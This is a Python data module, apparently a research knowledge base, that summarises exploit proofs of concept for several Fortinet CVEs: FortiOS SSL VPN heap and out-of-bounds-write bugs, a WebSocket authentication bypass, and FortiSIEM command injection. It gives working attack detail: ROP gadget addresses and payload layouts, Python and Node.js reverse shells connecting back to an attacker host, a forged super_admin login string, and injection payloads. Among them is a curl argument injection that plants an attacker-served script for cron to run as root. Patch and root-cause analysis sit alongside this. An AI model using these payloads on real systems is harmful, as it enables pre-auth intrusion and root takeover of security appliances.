"""
Fortinet SSL VPN (sslvpnd) binary RE + auth bypass CVEs + FortiSIEM Phoenix Monitor RE
Sources:
  - cve-pocs/CVE-2022-42475/cve-2022-42475.py (heap overflow PoC)
  - cve-pocs/CVE-2023-27997/CVE-2023-27997.py (XORtigate PoC, mislabeled)
  - cve-pocs/CVE-2024-21762/poc.py + README.md (OOB write; Assetnote)
  - cve-pocs/CVE-2024-55591/CVE-2024-55591.py + Storming the Fortress.md
  - cve-pocs/CVE-2024-55591-go/poc.go
  - horizon3ai-pocs/CVE-2023-34992/CVE-2023-34992.py (FortiSIEM cmdi)
  - horizon3ai-pocs/CVE-2024-23108/CVE-2024-23108.py (FortiSIEM 2nd-order cmdi)
  - horizon3ai-pocs/CVE-2025-64155/CVE-2025-64155.py (FortiSIEM arg injection)
Products: FortiOS sslvpnd, FortiOS Node.js WebSocket, FortiSIEM Phoenix Monitor
"""

# ---------------------------------------------------------
# sslvpnd binary RE: architecture
# ---------------------------------------------------------
FORTIOS_SSLVPND = {
    "id":       "FORTIOS-SSLVPND",
    "product":  "FortiOS SSL VPN daemon (sslvpnd)",
    "binary":   "sslvpnd -- 70MB+ all-in-one ELF; no PIE (fixed binary load address); no RELRO in vuln versions",
    "endpoints": {
        "/remote/error":               "POST -- heap overflow trigger (CVE-2022-42475)",
        "/remote/hostcheck_validate":  "POST -- heap spray stage (CVE-2024-21762)",
        "/":                           "POST Transfer-Encoding: chunked -- OOB write trigger (CVE-2024-21762)",
    },
    "note": (
        "No PIE = all gadget addresses in the sslvpnd binary are fixed across all copies of the same version. "
        "This makes ROP chains version-dependent but not ASLR-dependent for the binary text. "
        "Heap addresses are still randomized (requires heap spray or leak)."
    ),
}


# ---------------------------------------------------------
# CVE-2022-42475: sslvpnd heap overflow via fake Content-Length
# ---------------------------------------------------------
CVE_2022_42475 = {
    "cve":      "CVE-2022-42475",
    "product":  "FortiOS sslvpnd -- heap buffer overflow via oversized POST body",
    "cvss":     "9.8 (Critical) -- pre-auth RCE",
    "class":    "Heap buffer overflow (CWE-122); pre-auth",
    "vector":   "POST /remote/error HTTP/1.1 with Content-Length: 115964117980 (~108 GB)",
    "impact":   "Pre-auth remote code execution as root via ROP chain; actively exploited by APT groups",
    "exploited_in_wild": True,
}

CVE_2022_42475_MECHANICS = {
    "trigger": (
        "POST /remote/error with Content-Length: 115964117980 (0x1B0_0000_0000 -- 108 GB). "
        "sslvpnd allocates a receive buffer based on the Content-Length. "
        "If allocation succeeds (or partially fails), the 173096-byte spray + ROP chain "
        "overflows the heap buffer."
    ),

    "payload_layout": (
        "b'A'*173096 -- heap spray / overflow pad "
        "+ rdi (p64(hardcoded + 0xc48)) "
        "+ poprdi gadget "
        "+ cmd ptr "
        "+ pops gadget "
        "+ b'A'*40 "
        "+ pops gadget "
        "+ gadget1 (stack pivot: push rbx ; sbb [rbx+0x41], bl ; pop rsp ; pop rbp ; ret) "
        "+ b'C'*32 "
        "+ ropchain"
    ),

    "stack_pivot": (
        "gadget1 = 0x0000000001697e0d: 'push rbx ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret'. "
        "Effect: save rbx to stack, adjust [rbx+0x41], then pop rsp from stack. "
        "If rbx points to the attacker's ropchain region, this pivots rsp to the ropchain. "
        "Stack pivot is required because the overflow doesn't directly land on the return address."
    ),

    "ropchain": {
        "execve":   "0x0042e050 -- execve() in sslvpnd binary",
        "movrdirax":"0x00000000019d2196 -- mov rdi, rax ; call r13",
        "poprsi":   "0x000000000042f0f8 -- pop rsi ; ret",
        "poprdx":   "0x000000000042f4a5 -- pop rdx ; ret",
        "jmprax":   "0x0000000000433181 -- jmp rax",
        "pops":     "0x000000000165cfd7 -- pop rdx ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret",
        "poprax":   "0x00000000004359af -- pop rax ; ret",
        "poprdi":   "0x000000000042ed7e -- pop rdi ; ret",
    },

    "hardcoded_heap": (
        "hardcoded = 0x00007fc5f128e000 -- heap base address (version/run-specific). "
        "All offsets from this base: /bin/python at +0xc48, command at +0xd38. "
        "Needs bruteforce or heap-layout leak per target. "
        "The PoC author acknowledges: 'hardcoded value which would probably need to be bruteforced or leaked'."
    ),

    "payload_executes": (
        "/bin/python -c 'import socket, sys, os; s = socket.socket(...); s.connect((lhost, 31337)); "
        "[os.dup2(s.fileno(), x) for x in range(3)]; os.fork(); os.execve(\"/bin/sh\", cmd, {})' "
        "-- Python reverse shell because /bin/sh is restricted in FortiOS."
    ),

    "apt_context": (
        "CVE-2022-42475 was exploited by Chinese APT actors (later attributed to UNC3886, Volt Typhoon adjacent) "
        "as a zero-day before Fortinet's December 2022 advisory. "
        "CISA issued an emergency directive. MANDIANT published extensive IOC documentation."
    ),
}


# ---------------------------------------------------------
# CVE-2023-27997: XORtigate (PoC mislabeled)
# ---------------------------------------------------------
CVE_2023_27997 = {
    "cve":      "CVE-2023-27997",
    "product":  "FortiOS sslvpnd -- pre-auth heap overflow (XORtigate); separate from CVE-2022-42475",
    "cvss":     "9.8 (Critical) -- pre-auth RCE",
    "class":    "Heap buffer overflow; pre-auth; named XORtigate by watchTowr Labs discoverers",
    "discoverers": "Charles Fol + Dany Bach (watchTowr Labs)",

    "poc_note": (
        "The PoC in cve-pocs/CVE-2023-27997/CVE-2023-27997.py is BYTE-FOR-BYTE identical to CVE-2022-42475. "
        "Even the README references cve-2022-42475.py. "
        "This PoC is a mislabeled copy of the CVE-2022-42475 exploit, NOT the actual XORtigate exploit. "
        "The real XORtigate involves a length-check bypass in the SSL VPN handshake code path "
        "that is distinct from the Content-Length overflow trigger in CVE-2022-42475."
    ),

    "actual_xortigate_class": (
        "XORtigate (actual): the SSL VPN handshake code uses XOR obfuscation on length fields. "
        "A crafted client hello with a manipulated length field that survives the XOR check "
        "but causes a heap overflow when the de-obfuscated length is used as a buffer size. "
        "Trigger endpoint and exact gadgets differ from CVE-2022-42475. "
        "watchTowr's full technical write-up documents the distinct code path."
    ),
}


# ---------------------------------------------------------
# CVE-2024-21762: sslvpnd 2-byte OOB write -> full RCE (Assetnote)
# ---------------------------------------------------------
CVE_2024_21762 = {
    "cve":      "CVE-2024-21762",
    "product":  "FortiOS sslvpnd -- out-of-bounds write via chunked Transfer-Encoding; FGT_VM64-v7.4.2",
    "cvss":     "9.6 (Critical) -- pre-auth RCE",
    "class":    "Out-of-bounds write (CWE-787); 2 bytes; pre-auth; stack-to-heap structure hijack",
    "discoverers": "Assetnote ('Two bytes is plenty')",
    "binary_analyzed": "sub_18F4980 (patch location) and sub_1A111E0 (vulnerable stack frame)",
}

CVE_2024_21762_VULN_ROOT_CAUSE = {
    "vulnerable_function": "sub_18F4980 in sslvpnd (7.4.2 binary offset)",

    "mechanism": (
        "When sslvpnd processes a chunked HTTP body: "
        "  1. Reads chunk length field (hex ASCII). "
        "  2. If decoded value == 0: start reading chunk trailer. "
        "  3. Writes chunk trailer (CRLF = '\\r\\n') to buffer at offset = length(chunk_length_field). "
        "  4. BUG: if chunk_length_field is 4137+ zero bytes, the offset is 4137. "
        "  5. Target buffer is on stack in sub_1A111E0; return address at offset 0x2028. "
        "  6. Writing '\\r\\n' at offset 0x202e = two bytes written 6 bytes past the return address."
    ),

    "patch_diff": (
        "7.4.3 patch added: check ap_getline() return value > 16 -> reject as illegal chunk length. "
        "This prevents chunk_length_field longer than 16 bytes from reaching the write path. "
        "Second fix: changed line_off assignment source from *(_QWORD *)(a1 + 744) to ap_getline() return."
    ),

    "crash_poc": (
        "GET / HTTP/1.1\\r\\n"
        "Transfer-Encoding: chunked\\r\\n\\r\\n"
        "b'0'*((0x202e//2)-2) + b'\\r\\n' + b'a\\r\\n\\r\\n' "
        "-- crashes when function returns; rip = 0x0a0d (\\n\\r) = invalid address"
    ),
}

CVE_2024_21762_EXPLOIT_CHAIN = {
    "stage1_heap_spray": {
        "endpoint": "POST /remote/hostcheck_validate",
        "purpose":  "Set up forged a1 structures in heap + ROP chain for stage 2 to land in",
        "payload_structure": (
            "form_value = "
            "  'B'*11 + '/bin/node\\x00' + 'B'*6 + '-e\\x00' + 'B'*14 + js_payload "
            "+ 'B'*438 + pivot_2 + getcwd_ptr "
            "+ 'B'*32 + pivot_1 "
            "+ 'B'*168 + call_execl "
            "+ 'B'*432 + ssl_do_handshake_ptr "
            "+ 'B'*32 + rop + pivot_3 "
            "body = ('B'*1808 + '=' + form_value + '&') * 20  -- 20 repetitions for density"
        ),
        "jemalloc_heap_layout": (
            "a1 structure = 0x730 bytes -> allocated in 0x800 jemalloc heap block. "
            "Exhaust 0x800 tcache -> force new 0x800 allocations contiguous. "
            "Heap spray with forged structures at addresses where low 12 bits = 0xa0d. "
            "After '\\r\\n' overwrites low bytes of a1 pointer on stack: "
            "  pointer.low_bytes = 0x0d, 0x0a -> a1 now points to 0x?????0a0d. "
            "Spray ensures 0x?????0a0d is within the forged structure region."
        ),
    },

    "stage2_oob_trigger": {
        "endpoint":    "POST / HTTP/1.1 with Transfer-Encoding: chunked",
        "payload":     "b'0'*4137 + b'\\0' + b'A'*1 + b'\\r\\n\\r\\n'",
        "what_happens": (
            "4137 zeros = chunk_length_field; hex-decoded value = 0 -> enter trailer read mode. "
            "Writes '\\r\\n' at stack offset 4137 (just past return address area). "
            "Low bytes of saved r13 (= a1 pointer) on stack are overwritten with 0x0d, 0x0a. "
            "On function return, r13 is restored from stack with the tampered value. "
            "r13 now points into the heap spray region (forged a1 structure)."
        ),
    },

    "rip_hijack_via_ssl_do_handshake": (
        "The forged a1 structure (at the heap-spray address) has: "
        "  a1+0x298 = 0x4368d0 (address of ssl_do_handshake GOT entry). "
        "When sub_1A26040 / sub_1A27650 calls a1->func_ptr (multi-level pointer dereference), "
        "it calls SSL_do_handshake(ssl_obj). "
        "ssl_obj is the attacker-controlled a1 structure. "
        "SSL_do_handshake calls ssl->handshake_func(ssl). "
        "Attacker sets ssl->handshake_func = pivot_1 address = 'push rdi; pop rsp; ret'. "
        "This pivots rsp to the a1 structure content -> ROP chain executes."
    ),

    "rop_chain_call": (
        "ROP chain calls execl('/bin/node', '/bin/node', '-e', js_payload, NULL). "
        "execl = 0x0043c180 (binary offset). "
        "js_payload (URL-encoded in form value): "
        "  (function(){var cp=require('child_process'); cp.execSync('nslookup <oob.oastify.com>'); })(); "
        "For reverse shell: "
        "  net.Socket().connect(4242, lhost, ...) -> spawn('/bin/node', ['-i'])"
    ),

    "fortios_no_shell": (
        "FortiOS does not have /bin/sh available for command execution at the process level. "
        "The exploit chains use /bin/python or /bin/node (Node.js is bundled with FortiOS) "
        "as the execution environment for the reverse shell. "
        "Node.js require('child_process') is available, providing full OS access."
    ),
}


# ---------------------------------------------------------
# CVE-2024-55591: FortiOS Node.js WebSocket auth bypass -> super-admin
# ---------------------------------------------------------
CVE_2024_55591 = {
    "cve":      "CVE-2024-55591",
    "product":  "FortiOS + FortiProxy -- auth bypass via Node.js WebSocket (CWE-288)",
    "cvss":     "9.8 (Critical) -- pre-auth super-admin access",
    "class":    "Authentication bypass using alternate path/channel; race condition in CLI auth",
    "affected": {
        "FortiOS":    "7.0.0 - 7.0.16 (fix: 7.0.17)",
        "FortiProxy": "7.0.0 - 7.0.19 / 7.2.0 - 7.2.12 (fix: 7.0.20 / 7.2.13)",
    },
    "exploited_in_wild": True,
    "apt_attribution":   "Exploited by Chinese APT groups (Arctic Wolf: 'Console Chaos' campaign; Jan 2025)",
    "prerequisite":      "Knowledge of one valid admin username (readily obtained via other means or default 'admin')",
}

CVE_2024_55591_MECHANICS = {
    "websocket_endpoint": "/ws/cli/open?cols=162&rows=100&local_access_token=<any_string>",

    "bypass_part1_rest_api": (
        "Node.js WebSocket server's _getAdminSession() function: "
        "  const localToken = query.local_access_token; "
        "  if (localToken) { authParams += 'node-auth?local_access_token=' + localToken; } "
        "  return await new ApiFetch('monitor', 'web-ui', authParams); "
        "ApiFetch sends GET to: /api/v2/monitor/web-ui/node-auth?local_access_token=TOKEN "
        "The Node.js process runs on the FortiGate host (127.0.0.1) with User-Agent: 'Node.js'. "
        "The REST API's is_trusted_ip_and_user_agent() checks: IP == 127.0.0.1 AND UA == 'Node.js'. "
        "Both conditions are ALWAYS true for the Node.js process internal request. "
        "The local_access_token value is NEVER checked for authenticity -- only its presence. "
        "Result: any remote attacker who sends a WebSocket request with local_access_token=<anything> "
        "causes the internal API call to succeed, granting authentication."
    ),

    "bypass_part2_cli_race": (
        "After REST API bypass, Node.js opens CLI connection on port 8023 and will send loginContext: "
        "  'Local_Process_Access Local_Process_Access root ...' (limited permissions). "
        "RACE CONDITION (vulnerable code): "
        "  ws.on('message', (msg) => cli.write(msg));  -- registered BEFORE loginContext is sent. "
        "Attacker sends crafted loginContext over WebSocket immediately after connection: "
        "  '\"<username>\" \"admin\" \"root\" \"super_admin\" \"root\" \"none\" [127.0.0.1]:1337 [127.0.0.1]:1337' "
        "If attacker's message arrives before the system's loginContext: "
        "  CLI authenticates with super_admin privileges. "
        "The PoC retries 100 times in the Python variant to win the race."
    ),

    "authentication_string_format": (
        "CLI loginContext format (from port 8023 traffic capture): "
        "'\"username\" \"role\" \"vdom\" \"profile\" \"vdom2\" \"sso_type\" [client_ip]:port [server_ip]:port' "
        "Valid admin auth: '\"admin\" \"admin\" \"root\" \"super_admin\" \"root\" \"none\" [127.0.0.1]:N [127.0.0.1]:N' "
        "The attacker injects this string to claim super_admin on root vdom."
    ),

    "detection_check": (
        "GET /service-worker.js?local_access_token=fgt_lang HTTP/1.1 "
        "If response body contains 'api/v2/static' -> target is vulnerable. "
        "Token 'fgt_lang' appears in Go PoC; 'GIANTYELLOWDUCK' in Python PoC. "
        "ANY non-empty string works as local_access_token."
    ),

    "relationship_cve_2022_40684": (
        "CVE-2022-40684 (Oct 2022): same is_trusted_ip_and_user_agent function on the REST API. "
        "CVE-2022-40684 bypass: attacker directly sends HTTP request with X-Forwarded-For: 127.0.0.1 "
        "and User-Agent: 'Node.js' or 'Report Runner'. "
        "CVE-2024-55591 bypass: attacker triggers the is_trusted_ip_and_user_agent check indirectly "
        "through the Node.js WebSocket process, which always sends from 127.0.0.1 with Node.js UA. "
        "Root cause: the is_trusted_ip_and_user_agent function is the single point of trust "
        "for the administrative REST API, and it has been exploited twice in three years."
    ),

    "patch": (
        "7.0.17 patch: all references to local_access_token removed from _getAdminSession(). "
        "WebSocket message handler moved into setup() function (no longer in main flow before loginContext). "
        "Both the REST API bypass path and the CLI race condition fixed simultaneously."
    ),
}


# ---------------------------------------------------------
# FortiSIEM Phoenix Monitor service RE (Horizon3.ai CVEs)
# ---------------------------------------------------------
FORTISIEM_PHOENIX = {
    "id":       "FORTISIEM-PHOENIX",
    "product":  "FortiSIEM Phoenix Monitor service -- TCP port 7900 (TLS)",
    "binary":   "Internal FortiSIEM management daemon; Python/Java backend",
    "port":     7900,

    "protocol": {
        "header_format": "16-byte little-endian header: [cmd_type:4][payload_len:4][magic:4][reserved:4]",
        "magic":         "0x402F706F (1075724911 decimal) -- required magic value",
        "reserved":      "0x00000000",
        "payload":       "XML document (UTF-8 encoded)",
        "auth":          "NONE -- unauthenticated; no authentication on port 7900",
    },

    "command_types": {
        81:   "handleStorageRequest -- NFS/generic storage test (TEST_STORAGE type='nfs')",
        156:  "handleStorageRequest -- ElasticSearch storage test (TEST_STORAGE type='elastic')",
    },

    "note": (
        "Three separate CVEs (34992, 23108, 64155) all exploit the same Phoenix Monitor service. "
        "The protocol binary format is identical across all three. "
        "The vulnerability class is the same: unsanitized XML fields passed to shell commands. "
        "Each patch cycle fixed one field but left adjacent fields unsanitized."
    ),
}

CVE_2023_34992 = {
    "cve":      "CVE-2023-34992",
    "product":  "FortiSIEM -- unauthenticated command injection via Phoenix Monitor NFS server_ip field",
    "cvss":     "9.7 (Critical) -- pre-auth RCE as root",
    "class":    "Command injection (CWE-78); shell=True equivalent; unsanitized XML field",
    "discoverers": "Horizon3.ai (James Horseman, Zach Hanley)",

    "vulnerable_field": "<server_ip>",
    "injection_payload": "<server_ip>127.0.0.1; <cmd>;</server_ip>",

    "code_pattern": (
        "The NFS mount test builds a command string: "
        "  cmd = 'mount -t nfs ' + server_ip + ':' + mount_point + ' /tmp/...' "
        "server_ip is taken from the XML element without sanitization. "
        "Injected semicolons break the mount command and inject arbitrary commands."
    ),
}

CVE_2024_23108 = {
    "cve":      "CVE-2024-23108",
    "product":  "FortiSIEM -- unauthenticated 2nd-order command injection via mount_point field",
    "cvss":     "9.8 (Critical) -- pre-auth RCE as root; bypass of CVE-2023-34992 fix",
    "class":    "Second-order command injection (CWE-78); incomplete fix bypass",
    "discoverers": "Horizon3.ai (James Horseman, Zach Hanley)",

    "cve_34992_fix": "Fortinet sanitized the <server_ip> field after CVE-2023-34992.",
    "bypass": "The <mount_point> field was NOT sanitized by the CVE-2023-34992 fix.",

    "vulnerable_field": "<mount_point>",
    "injection_payload": "<mount_point>/lala; <cmd>;</mount_point>",

    "incomplete_fix_pattern": (
        "The CVE-2023-34992 fix added sanitization to the server_ip field only. "
        "The command construction concatenates multiple XML fields; "
        "only the first field was sanitized while adjacent fields remained injectable. "
        "Correct fix: sanitize at the command construction level (parameterized arguments), "
        "not at the individual field level."
    ),
}

CVE_2025_64155 = {
    "cve":      "CVE-2025-64155",
    "product":  "FortiSIEM -- argument injection via ElasticSearch cluster_url field -> file write -> cron RCE",
    "cvss":     "Not yet published at analysis time",
    "class":    "Argument injection (CWE-88); curl --next flag; arbitrary file write; cron persistence",
    "discoverers": "Horizon3.ai (James Horseman, Zach Hanley)",
    "blog":     "Horizon3.ai: 'Three Years of Remotely Rooting the Fortinet FortiSIEM'",

    "vulnerable_field": "<cluster_url> in TEST_STORAGE type='elastic'",
    "command_constructed": "/opt/phoenix/phscripts/bin/elastic_test_url.sh 'test_name' 'http://...'",

    "injection_mechanism": (
        "elastic_test_url.sh passes cluster_url to curl: "
        "  curl 'http://...' "
        "Injecting: 'http://attacker:9200 --next -o /opt/charting/redishb.sh http://attacker:9200' "
        "  -> curl fetches attacker URL, then (--next) fetches second URL and writes (-o) "
        "     to /opt/charting/redishb.sh. "
        "curl's --next flag allows chaining multiple URLs with independent options. "
        "This is not a shell injection (no semicolons) -- it is curl argument injection via "
        "curl's own option parsing."
    ),

    "exploit_chain": (
        "1. Run serve.py on attacker server (serves shell script payload at :9200). "
        "2. Send Phoenix Monitor packet with cluster_url set to argument-injected curl command. "
        "3. curl writes the shell script to /opt/charting/redishb.sh. "
        "4. Wait ~1 minute for FortiSIEM cron job to execute /opt/charting/redishb.sh as root. "
        "5. Shell script executes: reverse shell, SSH key install, etc."
    ),

    "three_year_pattern": (
        "CVE-2023-34992 (2023): server_ip field injection. Fixed: sanitized server_ip. "
        "CVE-2024-23108 (2024): mount_point field injection. Fixed: sanitized mount_point. "
        "CVE-2025-64155 (2025): cluster_url argument injection (different XML element type). "
        "The same Phoenix Monitor protocol with command=81 or command=156 was exploitable "
        "for 3+ years across 3 separate CVEs. "
        "Root cause never fixed: unauthenticated port 7900, shell command construction from XML."
    ),
}

FORTISIEM_SYSTEMIC = {
    "id":       "FORTISIEM-SYSTEMIC",
    "product":  "FortiSIEM -- systemic vulnerability pattern",
    "severity": "CRITICAL -- unauthenticated pre-auth RCE as root on SIEM appliance; network-accessible",

    "pattern": (
        "The Phoenix Monitor service (TCP 7900, TLS) is: "
        "  1. Unauthenticated -- any host that can reach port 7900 can send commands. "
        "  2. Exposes OS-level command execution indirectly via XML-to-shell command construction. "
        "  3. Has never been fixed at the root cause -- each patch only addresses the specific field "
        "     used in the most recent exploit. "
        "Correct architectural fix: "
        "  a. Require authentication on port 7900 (mutual TLS or session token). "
        "  b. Use parameterized command invocation (execv-style) rather than shell string construction. "
        "Both fixes are required; either alone leaves the other attack surface open."
    ),

    "impact": (
        "FortiSIEM is a SIEM (Security Information and Event Management) appliance. "
        "Compromise of the SIEM gives the attacker: "
        "  - Read access to all security event logs from all monitored devices. "
        "  - Understanding of the defender's visibility: what is logged, what is not. "
        "  - Potential for log tampering (delete evidence, inject false events). "
        "  - Platform pivot: SIEM has network access to all monitored network segments. "
        "This is a high-value target for APT operations (compromise SIEM = blind the defenders)."
    ),
}
